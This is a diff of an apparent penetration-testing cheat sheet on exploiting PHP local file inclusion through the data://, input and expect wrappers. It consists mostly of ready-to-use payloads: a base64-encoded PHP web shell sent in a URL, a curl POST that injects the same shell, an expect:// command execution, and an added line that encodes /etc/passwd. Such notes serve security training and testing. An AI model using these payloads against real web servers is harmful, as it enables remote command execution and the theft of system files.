@@ -28,8 +28,6 @@ Reverse shell Payload (Can be done with curl as well)
 ```http
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
-
-
 ### Input Wrapper
 
 (Sending data via curl)(Must accept post request)
@@ -38,7 +36,6 @@ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<POR
 ```
 
 **Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
-
 
 ### Expect Wrapper
 
@@ -53,3 +50,5 @@ Passing command through url stream
 ```shell-session
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
+
+data://text/plain;base64,L2V0Yy9wYXNzd2QK
